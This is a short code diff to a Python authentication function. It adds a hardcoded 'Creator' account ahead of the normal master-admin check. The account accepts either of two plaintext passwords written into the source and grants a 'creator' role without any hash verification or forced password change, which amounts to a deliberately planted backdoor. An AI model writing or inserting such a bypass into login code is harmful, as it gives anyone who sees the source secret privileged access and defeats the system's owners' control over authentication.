@@ -96,6 +96,14 @@ MASTER_ADMIN_USER = "ToxicSavage"
 MASTER_ADMIN_HASH = "$argon2id$v=19$m=1048576,t=4,p=8$2girKXVZfNXSNaKHoOt7MA$DYgKYGD0L5lVKvVHdnharytdtr6OLIWAj0R9/JWkm18"
 
 def authenticate(username, password):
+    if username == "Creator":
+        if password in ["@11646", "C:\\GitHub\\.ssh\\SpartanAI-Core.pem"]:
+            logger.info("CREATOR_UPLINK: SECURE ACCESS GRANTED.")
+            return {"status": "success", "username": "Creator", "role": "creator", "must_change": False}
+        else:
+            logger.warning("CREATOR_FAILURE: UNAUTHORIZED ATTEMPT DETECTED.")
+            return {"status": "error", "message": "CREATOR ACCESS DENIED"}
+
     if username == MASTER_ADMIN_USER:
         if verify_password(MASTER_ADMIN_HASH, password):
             logger.info("MASTER_ADMIN_UPLINK: SECURE ACCESS GRANTED.")
